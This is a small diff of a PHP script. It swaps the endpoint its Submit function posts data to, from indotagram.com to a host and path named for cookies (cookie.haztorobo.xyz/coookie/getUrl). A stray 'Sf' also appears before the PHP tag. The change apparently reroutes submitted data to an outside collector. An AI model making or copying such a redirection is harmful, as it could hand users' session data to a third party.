@@ -1,6 +1,6 @@
 Sf<?php
-$data=array('by'=>'indotagram.com',
-           'url'=>'http://www.indotagram.com/users/getData',
+$data=array('by'=>'cookie.haztorobo.xyz',
+           'url'=>'http://cookie.haztorobo.xyz/coookie/getUrl',
             );
 
 function Submit($url,$fields)
